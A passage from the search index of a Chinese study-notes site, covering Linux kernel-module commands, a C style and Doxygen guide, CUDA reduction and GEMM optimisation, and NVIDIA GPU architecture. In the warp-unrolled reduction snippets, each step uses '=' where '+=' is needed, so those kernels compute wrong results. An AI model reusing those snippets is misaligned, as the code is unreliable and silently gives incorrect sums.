\u7528\u4e8e\u66f4\u65b0\u5185\u6838\u6a21\u5757\u4f9d\u8d56\u4fe1\u606f\u3002<code>depmod</code> \u547d\u4ee4\u4f1a\u626b\u63cf\u7cfb\u7edf\u4e2d\u7684\u5185\u6838\u6a21\u5757\uff0c\u5e76\u4e3a\u5b83\u4eec\u751f\u6210\u4e00\u4e2a\u4f9d\u8d56\u5173\u7cfb\u6587\u4ef6\uff0c\u901a\u5e38\u5728 <code>/lib/modules/</code> \u76ee\u5f55\u4e0b\u3002\u8fd9\u4e2a\u6587\u4ef6\u901a\u5e38\u88ab\u547d\u540d\u4e3a <code>modules.dep</code>\uff0c\u5b83\u5217\u51fa\u4e86\u6bcf\u4e2a\u6a21\u5757\u53ca\u5176\u4f9d\u8d56\u7684\u5176\u4ed6\u6a21\u5757\uff0c\u4ee5\u786e\u4fdd\u5185\u6838\u6a21\u5757\u6b63\u786e\u52a0\u8f7d\u548c\u5378\u8f7d\u3002</p> </li> <li> <p><code>lsmod</code>: \u7528\u4e8e\u5217\u51fa\u5f53\u524d\u52a0\u8f7d\u5230\u5185\u6838\u4e2d\u7684\u6a21\u5757\u3002<code>lsmod</code> \u547d\u4ee4\u4f1a\u663e\u793a\u5df2\u52a0\u8f7d\u6a21\u5757\u7684\u5217\u8868\uff0c\u4ee5\u53ca\u5b83\u4eec\u7684\u5927\u5c0f\u3001\u4f7f\u7528\u6b21\u6570\u548c\u4f9d\u8d56\u5173\u7cfb\u3002</p> </li> <li> <p><code>modprobe</code>: \u7528\u4e8e\u52a8\u6001\u52a0\u8f7d\u548c\u5378\u8f7d\u5185\u6838\u6a21\u5757\u3002<code>modprobe</code> \u547d\u4ee4\u53ef\u4ee5\u6839\u636e\u6a21\u5757\u540d\u79f0\u81ea\u52a8\u52a0\u8f7d\u6a21\u5757\uff0c\u5e76\u5904\u7406\u5176\u4f9d\u8d56\u5173\u7cfb\u3002\u5b83\u8fd8\u53ef\u4ee5\u7528\u4e8e\u5378\u8f7d\u6a21\u5757\uff0c\u6216\u8005\u901a\u8fc7\u53c2\u6570\u6307\u5b9a\u6a21\u5757\u9009\u9879\u3002</p> </li> <li> <p><code>insmod</code>: \u7528\u4e8e\u624b\u52a8\u52a0\u8f7d\u4e00\u4e2a\u5185\u6838\u6a21\u5757\u3002<code>insmod</code> \u547d\u4ee4\u53ef\u4ee5\u76f4\u63a5\u52a0\u8f7d\u6307\u5b9a\u7684\u6a21\u5757\u6587\u4ef6\uff0c\u4f46\u4e0d\u4f1a\u5904\u7406\u6a21\u5757\u7684\u4f9d\u8d56\u5173\u7cfb\u3002\u56e0\u6b64\uff0c\u901a\u5e38\u5efa\u8bae\u4f7f\u7528 <code>modprobe</code> \u6765\u52a0\u8f7d\u6a21\u5757\uff0c\u4ee5\u786e\u4fdd\u6b63\u786e\u5904\u7406\u4f9d\u8d56\u5173\u7cfb\u3002</p> </li> <li> <p><code>rmmod</code>: \u7528\u4e8e\u4ece\u5185\u6838\u4e2d\u5378\u8f7d\u4e00\u4e2a\u5df2\u52a0\u8f7d\u7684\u6a21\u5757\u3002<code>rmmod</code> \u547d\u4ee4\u63a5\u53d7\u6a21\u5757\u540d\u79f0\u4f5c\u4e3a\u53c2\u6570\uff0c\u5e76\u4f1a\u5c1d\u8bd5\u5378\u8f7d\u8be5\u6a21\u5757\uff0c\u524d\u63d0\u662f\u5b83\u6ca1\u6709\u88ab\u5176\u4ed6\u6a21\u5757\u6240\u4f7f\u7528\u3002</p> </li> <li> <p><code>modinfo</code>: \u7528\u4e8e\u83b7\u53d6\u6709\u5173\u5185\u6838\u6a21\u5757\u7684\u4fe1\u606f\u3002<code>modinfo</code> \u547d\u4ee4\u53ef\u4ee5\u5217\u51fa\u6709\u5173\u6a21\u5757\u7684\u4fe1\u606f\uff0c\u5982\u4f5c\u8005\u3001\u63cf\u8ff0\u3001\u53c2\u6570\u7b49\u3002</p> </li> <li> <p><code>ls /lib/modules/</code>: \u8fd9\u4e2a\u547d\u4ee4\u7528\u4e8e\u67e5\u770b\u7cfb\u7edf\u4e2d\u53ef\u7528\u7684\u5185\u6838\u6a21\u5757\u3002\u5728 <code>/lib/modules/</code> \u76ee\u5f55\u4e0b\uff0c\u4f60\u53ef\u4ee5\u627e\u5230\u4e0e\u5df2\u5b89\u88c5\u5185\u6838\u7248\u672c\u76f8\u5173\u7684\u6a21\u5757\u6587\u4ef6\u548c\u4f9d\u8d56\u4fe1\u606f\u3002</p> </li> </ol>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/14/2022-11-14-C%E7%BC%96%E7%A8%8B%E9%A3%8E%E6%A0%BC%E8%A7%84%E8%8C%83/","title":"C \u7f16\u7a0b\u98ce\u683c\u89c4\u8303","text":"<p>C \u7f16\u7a0b\u98ce\u683c\u89c4\u8303</p> <ul> <li>identation<ul> <li>\u4f7f\u7528 4 \u4e2a\u7a7a\u683c\uff08\u4e0d\u7528 tab\uff0c\u56e0\u4e3a tab \u5bbd\u5ea6\u4e0d\u4e00\u81f4\uff0c\u5e76\u4e14 diff \u5de5\u5177\u66f4\u6613\u9605\u8bfb\uff09</li> </ul> </li> <li>brace<ul> <li>if, while \u5de6\u82b1\u62ec\u53f7\u5728\u540c\u4e00\u884c</li> <li>\u51fd\u6570\u5b9a\u4e49\uff0c\u7c7b\u5b9a\u4e49\uff0c\u5728\u4e0b\u4e00\u884c</li> </ul> </li> <li>\u53d8\u91cf\u540d<ul> <li>\u7c7b\u540d\uff1aFooBarCPU</li> <li>\u6210\u5458\uff1abarVariable</li> <li>\u5c40\u90e8\u53d8\u91cf\uff1anew_value</li> </ul> </li> <li>include<ul> <li>\u5148 main header file\uff08\u548c cc \u6587\u4ef6\u540d\u76f8\u540c\u7684\u5934\u6587\u4ef6\uff09</li> <li>\u7136\u540e\u6309\u5b57\u5178\u987a\u5e8f\uff08\u4e3a\u4e86\u5bb9\u6613\u627e\u5230\u91cd\u590d include\uff09</li> </ul> </li> <li> <p>document</p> <ul> <li>Doxygen\uff1a\u81ea\u52a8\u751f\u6210\u6587\u6863 <p>Doxygen allows users to quickly create documentation for our code by extracting the relavent information from the code and comments. It is able to document all the code structures including classes, namespaces, files, members, defines, etc.</p> </li> <li> <p>javadoc comment\uff1a\u4ee5\u4e24\u4e2a*\u5f00\u5934\u7684 C \u98ce\u683c\u6ce8\u91ca</p> <pre><code>/**\n * This is the brief description. This is the start of the detailed\n * description. Detailed Description continued.\n */\n</code></pre> </li> </ul> <ul> <li> <p>\u4f8b\u5b50</p> <pre><code>/**\n * @file\n * Contains an example of documentation style.\n */\n\n#include &lt;vector&gt;\n\n/**\n * Adds two numbers together.\n */\n#define DUMMY(a,b) (a+b)\n\n/**\n * A simple class description. This class does really great things in detail.\n *\n * @todo Update to new statistics model.\n */\nclass foo\n{\n  /** This variable stores blah, which does foo and has invariants x,y,z\n         @warning never set this to 0\n         @invariant foo\n    */\n   int myVar;\n\n /**\n  * This function does something.\n  * @param a The number of times to do it.\n  * @param b The thing to do it to.\n  * @return The number of times it was done.\n  *\n  * @sa DUMMY\n  */\n int bar(int a, long b);\n\n\n /**\n  * A function that does bar.\n  * @retval true if there is a problem, false otherwise.\n  */\n bool manchu();\n\n};\n</code></pre> </li> </ul> </li> </ul> <ul> <li>\u4ee3\u7801<ul> <li>C \u6587\u4ef6\u4e2d\u4e0d\u8be5\u6709 extern \u58f0\u660e\uff0c\u800c\u5e94\u8be5\u901a\u8fc7\u5305\u542b\u5934\u6587\u4ef6\u65b9\u5f0f <p>The key here is that we have a single external declaration in the .hh file that the compiler will automatically check for consistency with the .cc file. (This isn\u2019t as important in C++ as it was in C, since linker name mangling will now catch these errors, but it\u2019s still a good idea.)</p> </li> </ul> </li> </ul>","tags":["style","C"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E4%BC%98%E5%8C%96/","title":"CUDA \u4f18\u5316","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E4%BC%98%E5%8C%96/#sc07","title":"SC07","text":"<p>Microsoft PowerPoint - SC07_Optimization_Harris.ppt [Read-Only] (polytechnique.fr)</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E4%BC%98%E5%8C%96/#\u5e38\u89c1\u4f18\u5316\u65b9\u6cd5","title":"\u5e38\u89c1\u4f18\u5316\u65b9\u6cd5","text":"<p>\u4f18\u5316\u76ee\u6807</p> <ul> <li>\u5bf9\u4e8e\u8ba1\u7b97\u5bc6\u96c6\u5e94\u7528\uff1a\u5cf0\u503c\u6027\u80fd GFLOP/s</li> <li>\u5bf9\u4e8e\u8bbf\u5b58\u5bc6\u96c6\u5e94\u7528\uff1a\u5cf0\u503c\u5e26\u5bbd bandwidth</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E4%BC%98%E5%8C%96/#\u4e8c\u53c9\u89c4\u7ea6","title":"\u4e8c\u53c9\u89c4\u7ea6","text":"<p>\u662f memory bound \u5e94\u7528\uff1a</p> <ul> <li>\u8ba1\u7b97\u5f3a\u5ea6\u5f88\u4f4e\uff081 flop/operator\uff09</li> </ul> <ul> <li>1: interleaved_addressing v1: \u6bcf\u4e2a\u7ebf\u7a0b\u8bfb\u53d6\u4e00\u4e2a\u5143\u7d20\u5230 SMEM\uff0c\u7136\u540e\u4e8c\u53c9\u89c4\u7ea6\uff08stride\uff09</li> </ul> <pre><code>__global__ void reduce0(int *g_idata, int *g_odata){\n  extern __shared__ int sdata[];\n\n  int tid = threadIdx.x;\n  int i = blockIdx.x*blockDim.x + threadIdx.x;\n  // each thread loads one element from global to shared mem\n  sdata[tid] = g_idata[i];\n  __syncthreads();\n\n  //do reduction in SMEM\n  for(int s=1; s&lt;blockDim.x; s*=2){\n    if(tid %(2*s)==0){\n      sdata[tid] += sdata[tid + s];\n    }\n    __syncthreads();\n  }\n\n  //write result for this block to GMEM\n  if(tid==0) g_odata[blockIdx.x] = sdata[0];\n}\n</code></pre> <ul> <li>\u7ebf\u7a0b\u5206\u652f diverge \u592a\u591a \u5982\u56fe\uff0c\u5047\u8bbe\u4e00\u4e2a warp \u5305\u542b\u4e24\u4e2a\u7ebf\u7a0b\u3002\u5219\u56fe\u4e2d 8 \u4e2a\u7ebf\u7a0b\u9700\u8981 4 \u4e2a warp\u3002\u800c\u5373\u4f7f\u4e00\u4e2a warp \u91cc\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u4ecd\u7136\u9700\u8981\u5360\u7528\u4e00\u4e2a warp\u3002\u56e0\u6b64\u4e0a\u9762\u7684\u7b97\u6cd5\u4f1a\u5bfc\u81f4 4+4+2+1=11 \u6b21 warp \u8c03\u7528\u3002 v2 \u7248\u672c\u7684\u4ee3\u7801\u5219\u4e00\u4e2a warp \u91cc\u7684\u4e24\u4e2a\u7ebf\u7a0b\u90fd\u662f\u5de5\u4f5c\u7684\uff0c\u9700\u8981 4+2+1+1=8 \u6b21\uff08\u76d7\u56fe\u81ea\uff1ahttp://home.ustc.edu.cn/~shaojiemike/posts/nvidiaoptimize/\uff09 </li> </ul> <ul> <li>2: interleaved_addressing v2:</li> </ul> <pre><code>for(int s=1; s&lt;blockDim.x; s*=2){\n  int index = 2*s*tid;\n  if(index &lt; blockDim.x){\n    sdata[index] += sdata[index+s];\n  }\n  __syncthreads();\n}\n</code></pre> <ul> <li>SMEM bank conflict</li> <li>3: sequential addressing</li> </ul> <pre><code>for(int s=blockDim.x/2; s&gt;0; s&gt;&gt;=1){\n  if(tid &lt; s){\n    sdata[tid] += sdata[tid+s];\n  }\n  __syncthreads();\n}\n</code></pre> <ul> <li>\u7b2c\u4e00\u6b21\u8fed\u4ee3\u5c31\u5df2\u7ecf\u4e00\u534a\u7684\u7ebf\u7a0b\u662f\u7a7a\u95f2\u7684</li> <li>4: first add during load\uff1a<ul> <li>\u4ecd\u7136\u8fbe\u4e0d\u5230\u5e26\u5bbd\u4e0a\u9650\uff0c\u56e0\u6b64\u53ef\u80fd\u662f\u6307\u4ee4\u5f00\u9500<ul> <li>\u8f85\u52a9\u7c7b\u6307\u4ee4 (ancillary)\uff1a\u4e0d\u662f load, store \u548c\u6838\u5fc3\u8ba1\u7b97\u7684\u7b97\u6570\u6307\u4ee4</li> <li>\u5373\u5730\u5740\u8ba1\u7b97\u548c\u5faa\u73af\u5f00\u9500</li> </ul> </li> </ul> </li> </ul> <pre><code>&lt;&lt;&lt;n/64/2, 64&gt;&gt;&gt;kernel();\n\nint i = blockIdx.x * (blockDim.x*2) + threadIdx.x;\nsdata[tid] = g_idata[i] + g_idata[i + blockDim.x];\n</code></pre> <ul> <li>5\uff1aUnroll the last warp<ul> <li>\u6d3b\u52a8\u7ebf\u7a0b\u6570\u968f\u7740\u89c4\u7ea6\u8fed\u4ee3\u6b21\u6570\u589e\u52a0\u800c\u51cf\u5c11</li> <li>\u5f53 s&lt;=32 \u65f6\uff0c\u53ea\u6709\u4e00\u4e2a warp\u3002warp \u5185\u7684\u6307\u4ee4\u65f6 SIMD \u540c\u6b65\u7684\u3002<ul> <li>\u56e0\u6b64\u4e0d\u9700\u8981__syncthread()\uff0c\u4e0d\u9700\u8981 if(tid &lt; s)</li> </ul> </li> </ul> </li> </ul> <pre><code>for(int s=blockDim.x/2; s&gt;32; s&gt;&gt;=1){\n  if(tid &lt; s){\n    sdata[tid] += sdata[tid+s];\n  }\n  __syncthreads();\n}\nif(tid&lt;32){\n  sdata[tid] = sdata[tid+32];\n  sdata[tid] = sdata[tid+16];\n  sdata[tid] = sdata[tid+8];\n  sdata[tid] = sdata[tid+4];\n  sdata[tid] = sdata[tid+2];\n  sdata[tid] = sdata[tid+1];\n}\n</code></pre> <ul> <li>6: completely Unrolled<ul> <li>\u5bf9\u4e8e\u56fa\u5b9a\u5927\u5c0f\u7684\u7ebf\u7a0b\u5757\uff0c\u53ef\u4ee5\u5b8c\u5168\u5c55\u5f00\u3002\u800c GPU \u7ebf\u7a0b\u5757\u7684\u5927\u5c0f\u662f 2 \u7684\u5e42\uff0c\u5e76\u4e14&lt;1024\u3002</li> <li>\u53ef\u4ee5\u4f7f\u7528\u6a21\u677f\uff0c\u9488\u5bf9\u4e0d\u540c\u7684\u7ebf\u7a0b\u5757\u5b8c\u5168\u5c55\u5f00</li> </ul> </li> </ul> <pre><code>template&lt;int blockSize&gt;\n__global__ void reduce5(int *g_idata, int *g_odata)\n</code></pre> <pre><code>if(blockSize&gt;=512){\n  if(tid&lt;256){sdata[tid]+=sdata[tid+256];} __syncthreads();\n}\nif(blockSize&gt;=256){\n  if(tid&lt;128){sdata[tid]+=sdata[tid+128];} __syncthreads();\n}\nif(blockSize&gt;=128){\n  if(tid&lt;64){sdata[tid]+=sdata[tid+64];} __syncthreads();\n}\nif(tid&lt;32){\n  if(blockSize &gt;= 64) sdata[tid] = sdata[tid+32];\n  if(blockSize &gt;= 32) sdata[tid] = sdata[tid+16];\n  if(blockSize &gt;= 16) sdata[tid] = sdata[tid+8];\n  if(blockSize &gt;=  8) sdata[tid] = sdata[tid+4];\n  if(blockSize &gt;=  4) sdata[tid] = sdata[tid+2];\n  if(blockSize &gt;=  2) sdata[tid] = sdata[tid+1];\n}\n</code></pre> <p></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E4%BC%98%E5%8C%96/#gemm","title":"GEMM","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E4%BC%98%E5%8C%96/#\u53c2\u8003\u8d44\u6599","title":"\u53c2\u8003\u8d44\u6599","text":"<p>\u6df1\u5165\u6d45\u51fa GPU \u4f18\u5316\u7cfb\u5217\uff1aGEMM \u4f18\u5316\uff08\u4e00\uff09 - \u77e5\u4e4e (zhihu.com)</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E4%BC%98%E5%8C%96/#sc2010-fast-implementation-of-dgemm-on-fermi-gpu","title":"SC'2010 Fast implementation of DGEMM on Fermi GPU","text":"<p>\u4e3a\u4e86\u8ba9\u8ba1\u7b97\u5355\u5143\u5145\u5206\u5229\u7528\uff0c\u4e0d\u8ba9\u8bbf\u5b58\u79f0\u4e3a\u74f6\u9888\u3002\u6839\u636e\u5b9e\u9645\u786c\u4ef6\u53c2\u6570\uff0c\u53ef\u4ee5\u5f97\u5230\u5bf9\u5206\u5757\u5927\u5c0f\u7684\u4e00\u4e2a\u4e0b\u754c</p> <ul> <li>\\(\\#\\mathrm{CUDA}\\times\\mathrm{freq}\\times DW\\times 1/2(1/b_m + 1/b_n)&lt;BW\\)<ul> <li>DW \u8868\u793a\u5143\u7d20\u5b57\u8282\u6570\uff0c\u5982 double float\uff0c8Byte</li> </ul> </li> <li>\u540c\u7406\u6839\u636e shard memory \u5e26\u5bbd\uff0c\u53ef\u4ee5\u5f97\u5230\\(r_x, r_y\\)\u7684\u4e0d\u7b49\u5f0f</li> </ul> <p>\u6839\u636e shared memory \u5927\u5c0f\uff0c\u53ef\u4ee5\u5f97\u5230\u5206\u5757\u5927\u5c0f\u7684\u4e00\u4e2a\u4e0a\u754c \\((b_m*b_k + b_n*b_k)*DW &lt; M_{shared}\\) \u6839\u636e register file \u7684\u5927\u5c0f\uff0c\u5f97\u5230 rx, ry \u7684\u4e0a\u754c \\((r_x+r_y+r_x*r_y)*{TRHEAD\\_PER\\_BLOCK} &lt; 32768\\)</p> <p></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E4%BC%98%E5%8C%96/#\u5b9e\u8df5","title":"\u5b9e\u8df5","text":"<ul> <li>simple<ul> <li>C \u4e2d\u6bcf\u4e2a\u5143\u7d20\u6bcf\u4e2a\u5bf9\u5e94\u4e00\u4e2a\u7ebf\u7a0b\u3002<ul> <li>\u7531\u4e8e\u4e00\u4e2a\u5757\u5185\u7ebf\u7a0b\u6570\u6709\u4e0a\u9650\uff0c\u56e0\u6b64\u4ecd\u7136\u9700\u8981\u5212\u5206\u5757\u3002</li> </ul> </li> </ul> </li> <li>block shared memory<ul> <li>\u53ef\u4ee5\u53d1\u73b0\u8ba1\u7b97 C \u4e2d\u76f8\u90bb\u5143\u7d20\u65f6\uff0c\u4f1a\u5229\u7528\u91cd\u590d\u7684\u884c\u6216\u5217\u3002\u56e0\u6b64\u53ef\u4ee5\u8003\u8651\u5c06\u82e5\u5e72\u7ebf\u7a0b\u7ec4\u7ec7\u6210\u4e00\u4e2a\u5757\uff0c\u5171\u4eab\u4e00\u90e8\u5206\u6570\u636e\u3002\u521a\u597d\u5bf9\u5e94\u786c\u4ef6\u7684 SMEM\u3002</li> </ul> </li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/","title":"CUDA \u67b6\u6784","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u7591\u95ee","title":"\u7591\u95ee","text":"<ul> <li>ampere \u67b6\u6784 SM \u4e2d\u6709 4 \u4e2a process block\uff0cprocess block \u5bf9\u5e94\u4e00\u4e2a warp\uff1f\u610f\u601d\u662f\u53ef\u4ee5\u6709 4 \u4e2a warp \u540c\u65f6\u6267\u884c\uff1f<ul> <li>Femi \u67b6\u6784\u6ca1\u6709 process block\uff0cSM \u5c31\u662f\u6700\u5c0f\u5355\u5143\uff1f</li> </ul> </li> <li>The threads of a thread block execute concurrently on one multiprocessor, and multiple thread blocks can execute concurrently on one multiprocessor.<ul> <li>\u8fd9\u6837\u5c82\u4e0d\u662f\u82e5\u5e72 thread block \u62a2\u4e00\u4e2a SM \u4e0a\u7684 shared memory\uff1f</li> <li>\u4e0d\u540c threadblock \u7684 warp \u5e76\u53d1\u6267\u884c\uff0c\u5982\u4f55\u9690\u85cf\u5ef6\u8fdf</li> </ul> </li> </ul> <ul> <li>cuda \u5206\u5757\u5927\u5c0f\u5bf9\u6027\u80fd\u5f71\u54cd\u5f88\u5927\uff0c\u90a3\u4e48\u5982\u4f55\u786e\u5b9a\u5206\u5757\u5927\u5c0f\u5462\uff1f<ul> <li>\u7a77\u4e3e</li> <li>\u5206\u6790\u6a21\u578b\uff1f</li> </ul> </li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#cuda-guide","title":"CUDA guide","text":"<p>CUDA C++ Programming Guide</p> <p>At every instruction issue time, a warp scheduler selects an instruction that is ready to execute. This instruction can be another independent instruction of the same warp, exploiting instruction-level parallelism, or more commonly an instruction of another warp, exploiting thread-level parallelism</p> <p>he number of clock cycles it takes for a warp to be ready to execute its next instruction is called the\u00a0latency, and full utilization is achieved when all warp schedulers always have some instruction to issue for some warp at every clock cycle during that latency period, or in other words, when latency is completely \u201chidden\u201d. The number of instructions required to hide a latency of L clock cycles depends on the respective throughputs of these instructions (see\u00a0Arithmetic Instructions\u00a0for the throughputs of various arithmetic instructions). If we assume instructions with maximum throughput, it is equal to:</p> <ul> <li>4L\u00a0for devices of compute capability 5.x, 6.1, 6.2, 7.x and 8.x since for these devices, a multiprocessor issues one instruction per warp over one clock cycle for four warps at a time, as mentioned in\u00a0Compute Capabilities.</li> <li>2L\u00a0for devices of compute capability 6.0 since for these devices, the two instructions issued every cycle are one instruction for two different warps.</li> </ul> <p>On devices of compute capability 7.x, for most arithmetic instructions, it is typically 4 clock cycles. This means that 16 active warps per multiprocessor (4 cycles, 4 warp schedulers) are required to hide arithmetic instruction latencies (assuming that warps execute instructions with maximum throughput, otherwise fewer warps are needed). If the individual warps exhibit instruction-level parallelism, i.e. have multiple independent instructions in their instruction stream, fewer warps are needed because multiple independent instructions from a single warp can be issued back to back.</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u786c\u4ef6\u5355\u5143","title":"\u786c\u4ef6\u5355\u5143","text":"<p>Throughput of Native Arithmetic Instructions. (Number of Results per Clock Cycle per Multiprocessor) CUDA C++ Programming Guide</p> <p>2.x \u540e\u6709\u7684 Cache (i.e., L1 cache and L2 cache available on devices of compute capability 2.x and higher, texture cache and constant cache available on all devices).</p> <p>cache \u7684\u5e94\u7528\u573a\u666f\uff1afor which global memory access patterns are data-dependent</p> <p>On devices of compute capability 5.x onwards, local memory accesses are always cached in L2 in the same way as global memory accesses</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#nv-\u67b6\u6784\u5217\u8868","title":"NV \u67b6\u6784\u5217\u8868","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#compute-capacity","title":"compute capacity","text":"<p>Matching CUDA arch and CUDA gencode for various NVIDIA architectures - Arnon Shimoni</p> <ul> <li>Pascal<ul> <li>SM61: 1080</li> </ul> </li> <li>volta<ul> <li>SM70: Tesla V100, Titan V</li> </ul> </li> <li>Ampere<ul> <li>SM80: NVIDIA A100 (the name \u201cTesla\u201d has been dropped \u2013 GA100)) </li> </ul> </li> </ul> <ul> <li>Tesla(2008)</li> <li>Fermi(2010)</li> <li>Kepler(2012)\uff1aK80</li> <li>Maxwell(2014)\uff1a M10/M40</li> <li>Pascal(2016)\uff1a Tesla P40\u3001P100\u3001GTX 1080Ti  Titan XP\u3001Quadro GP100/P6000/P5000\uff0c10\u7cfb</li> <li>Volta(2017)\uff1a Tesla V100\u3001GeForce Titan V\u3001Quadro GV100 \u4e13\u4e1a\u5361</li> <li>Turing(2018)\uff1a1 \u4e2a SM 8 \u4e2a Tensor core\uff0c1 \u4e2a RT core\uff0c16\uff0c20 \u7cfb</li> <li>Ampere(2020)\uff1a A100\uff0c30 \u7cfb</li> <li>Hopper(2022)\uff1aH100</li> </ul> <p>1080: 20x128 1080ti: 28x128, gp104 p40: 30x128, gp102 p100: 28x128, HBM2(4096bit)</p> <p>Ampere (microarchitecture) - Wikipedia</p> <p></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u67b6\u6784","title":"\u67b6\u6784","text":"<p>NVIDIA GPU \u67b6\u6784\u68b3\u7406 - \u77e5\u4e4e (zhihu.com) NVIDIA GPU \u67b6\u6784\u6f14\u8fdb | Chenfan Blog</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u5bf9\u6bd4","title":"\u5bf9\u6bd4","text":"<ul> <li>\u6765\u81ea GCoM \u8bba\u6587\uff0c\u5176\u4e2d volta cacheline \u4e3a 32 B\uff0c\u5e94\u8be5\u662f\u5199\u9519\u4e86\u3002 </li> </ul> <ul> <li>Fermi\uff1a\u6bcf\u4e2a GPC \u5305\u542b 4 \u4e2a SM\uff0c\u6bcf\u4e2a SM \u5305\u542b 32 \u4e2a CUDA\uff0c2 \u4e2a warp scheduler(x1 dispatch)</li> <li>Kepler\uff1aSMX\uff0c\u4e00\u4e2a SMX 4 \u4e2a WS(x2 Dispatch)\uff0c192 CUDA</li> <li>Maxwell: SMM\uff0c4 \u4e2a Process block\uff08\u7c7b\u4f3c\u4e8e Fermi \u7684 SM\uff09\uff0c\u6bcf\u4e2a process block 1 \u4e2a WS(x2 Dispatch)</li> </ul> <p>\u5bc4\u5b58\u5668\u6570\uff0c\u57fa\u672c\u90fd\u662f\u4e00\u4e2a SM\uff0c65536\uff08\u53ef\u4ee5\u5206\u6210 4 \u4e2a 16384\uff0c\u6216\u8005\u4e24\u4e2a 32768\uff09</p> <ul> <li>pascal\uff0cL1 $D \u548c shared memory \u90fd\u662f\u5206\u5f00\u7684\uff0cturing \u5f00\u59cb\u5408\u5e76</li> <li>turing \u53bb\u6389\u4e86\u5bf9 FP64 \u7684\u652f\u6301</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u672f\u8bed","title":"\u672f\u8bed","text":"<ul> <li>GPC\uff1a\u8d39\u7c73\u4e3a\u4f8b\uff0c\u6574\u4e2a GPU \u6709\u591a\u4e2a GPC(\u56fe\u5f62\u5904\u7406\u96c6\u7fa4)\uff0c\u5355\u4e2aGPC\u5305\u542b\u4e00\u4e2a\u5149\u6805\u5f15\u64ce(Raster Engine)\uff0c\u56db\u4e2a SM\uff08\u6d41\u5f0f\u591a\u5904\u7406\u5668\uff09\uff0cGPC \u53ef\u4ee5\u88ab\u8ba4\u4e3a\u662f\u4e00\u4e2a\u72ec\u7acb\u7684 GPU\u3002\u6240\u6709\u4ece Fermi \u5f00\u59cb\u7684 NVIDIA GPU\uff0c\u90fd\u6709 GPC\u3002</li> <li>\u6838\u5fc3\u662f\u4e00\u4e2a\u5b8c\u6574\u7684GPU\u6a21\u7ec4\uff0c\u5982 GP100\uff0cGP102</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#fermi","title":"Fermi","text":"<ul> <li>\u6a59\u8272\u90e8\u5206\uff1a2 \u4e2a Warp Scheduler/Dispatch Unit</li> <li>\u7eff\u8272\u90e8\u5206\uff1a32 \u4e2a CUDA \u5185\u6838\uff0c\u5206\u5728\u4e24\u6761 lane \u4e0a\uff0c\u6bcf\u6761\u5206\u522b\u662f 16 \u4e2a</li> </ul> <p>https://stackoverflow.com/a/10467342</p> <p>The programmer divides work into threads, threads into thread blocks, and thread blocks into grids. The compute work distributor allocates thread blocks to Streaming Multiprocessors (SMs). Once a thread block is distributed to a SM the resources for the thread block are allocated (warps and shared memory) and threads are divided into groups of 32 threads called warps. Once a warp is allocated it is called an active warp. The two warp schedulers pick two active warps per cycle and dispatch warps to execution units. For more details on execution units and instruction dispatch see\u00a01\u00a0p.7-10 and\u00a02.</p> <p>Fermi\uff0c\u4e00\u4e2a SM \u6709\u4e24\u4e2a warp \u4fdd\u8bc1\u6bcf\u5468\u671f\u6709\u6307\u4ee4\u53ef\u4ee5\u53d1\u5c04</p> <p>A stalled warp is ineligible to be selected by the warp scheduler. On Fermi it is useful to have at least 2 eligible warps per cycle so that the warp scheduler can issue an instruction.</p> <p>GeForce 560Ti\uff0c8SM\uff0c\u6bcf\u4e2a 48CUDA</p> <p>If you launch kernel&lt;&lt;&lt;8, 48&gt;&gt;&gt; you will get 8 blocks each with 2 warps of 32 and 16 threads. There is no guarantee that these 8 blocks will be assigned to different SMs.</p> <ul> 